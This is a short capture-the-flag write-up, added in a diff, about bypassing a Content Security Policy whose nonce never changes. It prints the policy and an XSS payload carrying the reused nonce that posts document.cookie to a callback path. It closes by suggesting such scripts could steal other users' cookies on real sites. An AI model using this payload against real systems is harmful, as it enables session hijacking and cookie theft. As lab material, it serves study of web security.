@@ -1,0 +1,32 @@
+Looking at the website the main point of this challenge is understanding and CSP rules
+
+The main problem with the given rules for the website was that when coming back to the website
+the nonce value was the same every time
+
+nonce (Number used once): A password for script
+
+default-src 'self';
+script-src 'self' 'nonce-8b5817213e30465180d52fd44dca0640';
+style-src 'self' 'unsafe-inline';
+img-src 'self' data:;
+object-src 'none';
+base-uri 'none';
+report-uri /csp-report
+
+Looking into this we find that it should not be doing this. Should be a new nonce every time the page loads
+
+We can take advantage of this by forcing our script to use the given nonce
+
+<script nonce="8b5817213e30465180d52fd44dca0640">
+   fetch('/callback', {
+       method: 'POST',
+       headers: { 'Content-Type': 'application/json' },
+       body: JSON.stringify({ stolen_flag: document.cookie })
+   });
+</script>
+
+
+In this case we could just run the code in the given section, but in the rule world
+We would try and run this in a chat space or anywhere that is miss-configured to allow us to run
+our own scripts. Could also try and compromise the server and then run the script on
+other user's browsers. This could start to lead to cookie stealing.
